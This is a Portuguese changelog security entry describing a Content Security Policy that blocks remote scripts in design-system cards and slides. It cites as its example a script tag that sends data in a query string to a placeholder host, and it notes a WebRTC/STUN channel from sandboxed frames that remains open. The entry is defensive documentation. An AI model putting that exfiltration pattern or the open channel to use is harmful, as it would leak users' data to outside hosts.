### Security

- **A CSP aplicada passa a bloquear scripts remotos (md-exfil T11, ADR-9).** O cabeçalho agora inclui
  `default-src 'self'` e `script-src 'self' 'unsafe-inline'`. Um script de um card de design system, ou de um slide que
  passasse pelo sanitizador, não consegue mais carregar `<script src=https://host/x.js?d=<dados>>`: o carregamento é
  bloqueado e reportado (`csp_violation`), e o script inline do editor de slides e dos design systems segue funcionando.
  As duas diretivas nunca recebem origens da lista permitida, `blob:`, `'unsafe-eval'` nem `*`.

  **Atenção:** um design system que carregue uma biblioteca de um CDN deixa de funcionar; é preciso embutir a biblioteca
  no zip. `CSP_EGRESS=report` no `app.yaml` (com novo deploy do mesmo build) remove essas duas diretivas junto com as de
  egress. A navegação de um frame com sandbox para um host externo é
  bloqueada pelo `frame-src`; continua aberto, enquanto houver script inline num frame com sandbox, o WebRTC (pacote STUN
  para um host externo); fechá-lo exige servir esses frames de uma origem própria. O MCP App deixa de gerar o relatório
  de `eval` do zod (`jitless`).
